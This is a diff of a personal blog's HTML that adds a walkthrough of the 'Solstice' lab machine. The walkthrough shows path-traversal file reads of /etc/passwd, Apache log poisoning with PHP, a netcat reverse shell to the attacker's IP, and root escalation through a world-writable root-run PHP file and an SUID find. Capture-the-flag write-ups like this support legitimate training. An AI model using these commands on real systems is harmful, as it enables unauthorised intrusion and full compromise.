@@ -400,6 +400,166 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sev1on.github.io/2021/07/31/Solstice/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sev1on">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/07/31/Solstice/" itemprop="url">Kevin</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-31T03:11:12+00:00">
+                2021-07-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <span id="more"></span>
+
+<h1 id="Exploitation-Guide-for-Solstice"><a href="#Exploitation-Guide-for-Solstice" class="headerlink" title="Exploitation Guide for Solstice"></a><strong>Exploitation Guide for Solstice</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>This machine is exploited by combining a LFI with a log poisoning attack. It is escalated with a world-writable file.</p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p- -sV 192.168.120.167</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT</span><br><span class="line">Nmap scan report for 192.168.120.167</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">Not shown: 65428 closed ports, 96 filtered ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         pyftpdlib 1.5.6</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">3128/tcp  open  http-proxy  Squid http proxy 4.6</span><br><span class="line">8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">62524/tcp open  ftp         FreeFloat ftpd 1.00</span><br><span class="line">Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Web-server-on-port-8593"><a href="#Web-server-on-port-8593" class="headerlink" title="Web server on port 8593"></a><strong>Web server on port 8593</strong></h3><p>This web app appears to be under construction, with only a limited number of functionalities available to us.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>By executing a simple manual fuzzing, we find a LFI vulnerability in the <code>book</code> parameter, allowing us to few the contents of <strong>/etc/passwd</strong>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../etc/passwd</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">saned:x:107:118::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">miguel:x:1000:1000:,,,:/home/miguel:/bin/bash</span><br><span class="line">uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Web-server-on-port-80"><a href="#Web-server-on-port-80" class="headerlink" title="Web server on port 80"></a><strong>Web server on port 80</strong></h3><p>Now that we have a LFI on the one application, we can attempt to poison the log file of the web application running on port 80. This can be achieved by sending a malicious PHP command to the web application.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php echo &#x27;TEST123&#x27; ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Tue, 11 Aug 2020 21:16:09 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">Content-Length: 301</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Then use the LFI to verify if the attack worked.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] &quot;GET TEST123 HTTP/1.1\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>As we can see, the php code got executed. We can use this to execute commands.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Injecting-the-payload"><a href="#Injecting-the-payload" class="headerlink" title="Injecting the payload"></a><strong>Injecting the payload</strong></h3><p>We can use the log poisoning attack to inject our payload.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php system(&#x27;nc -e /bin/bash 192.168.118.9 444&#x27;); ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Executing-it"><a href="#Executing-it" class="headerlink" title="Executing it"></a><strong>Executing it</strong></h3><p>First, start our listener.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Then trigger it with the LFI.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We receive our shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [192.168.118.9] from (UNKNOWN) [192.168.120.167] 52810</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@solstice:/var/tmp/webserver$</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250</span><br><span class="line">stty rows 50 cols 250</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>Checking the running processes, we can find a local web server running as root.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps aux</span><br><span class="line">ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">...</span><br><span class="line">root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line">root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>If we look into that folder, we can see that the <strong>index.php</strong> file is world-writable.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv</span><br><span class="line">ls -l /var/tmp/sv</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We can use it to execute commands as root. Let’s make <code>find</code> run with the SUID bit.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line">echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ curl localhost:57</span><br><span class="line">curl localhost:57</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find</span><br><span class="line">ls -l /usr/bin/find</span><br><span class="line">-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Then use <code>find</code> to escalate our shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit</span><br><span class="line">find . -exec /bin/bash -p \; -quit</span><br><span class="line">bash-5.0# id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://sev1on.github.io/2021/07/30/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -565,7 +725,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -578,7 +738,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
